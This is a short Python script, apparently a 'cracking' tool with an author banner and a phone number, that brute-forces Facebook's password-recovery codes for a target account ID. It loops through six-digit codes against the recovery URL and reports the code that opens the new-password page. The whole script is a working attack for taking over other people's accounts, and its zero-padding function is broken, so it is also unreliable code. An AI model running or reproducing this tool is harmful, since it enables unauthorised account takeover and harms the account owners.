import requests , os , re , time , ssl , sys
os.system('clear')
a=requests.Session()
def D(code):
    z=len(str(code))
    if z<6:
        h=6-z
    else:
        return str(code)
        return "0"*h+str(code)
print ("\033[1;32mwelcome\033[1;35m to\033[1;36m HETLAR\033[1;34m 7AKEM\033[1;33m EL3ALAM\033[1;30m FBCODE\033[1;32m tool")
time.sleep(0.1)
print ("\033[1;35mphone\033[1;30m :\033[1;32m 201148422820")
time.sleep(0.1)
print ("\033[1;30m+---------------------------------+")
time.sleep(0.1)
print ("\033[1;30m|\033[1;32m [+]\033[1;34m HETLAR 7AKEM EL3ALAM   \033[1;32m[+]\033[1;30m  |")
time.sleep(0.1)
print ("\033[1;30m|\033[1;32m [+]\033[1;33m     Ma7moud med7at    \033[1;32m [+]\033[1;30m  |")
time.sleep(0.1)
print ("\033[1;30m|\033[1;32m [+]\033[1;36m       Database_HK     \033[1;32m [+]\033[1;30m  |")
time.sleep(0.1)
print ("\033[1;30m+---------------------------------+")
time.sleep(0.1)
print ("\033[1;31mDont forget to put quotation")
time.sleep(0.1)
print("marks when you enter ID ")
time.sleep(0.1)
print("with regards (HETLAR)")
print ("            " + "                " + "                ")
print ("programmed by HETLAR 7AKEM EL3ALAM")

id=input("\033[1;32mId Acount >> : ")
code=int(input("\033[1;36mStart Code >> : "))
m=input("\033[1;33moff Code >> ")
os.system('clear')
print('\033[1;34m[*] Account \033[1;30m'+ id)
time.sleep(1)
print('\033[1;31m[*] code on \033[1;30m'+ str(D(code)))
time.sleep(1)
print('\033[1;33m[*] code off\033[1;30m '+ D(m))
time.sleep(1)
print('\033[1;35m[*] Cracking Please wait ...')
print('')
print('')
time.sleep(2)
while code < 999999:
    code=code+1
    url="https://www.facebook.com/recover/password/?u="+str(id)+"&n="+str(D(code))
    r=a.get(url)
    ap=r.text
    search=re.search("password_new",ap)
    if search:
        print ("\033[1;36m[+] This is the code\033[1;31m "+ D(code))
    else:
        print ("\033[1;31m[-]\033[1;35m testing Guess \033[1;32m"+ D(code))
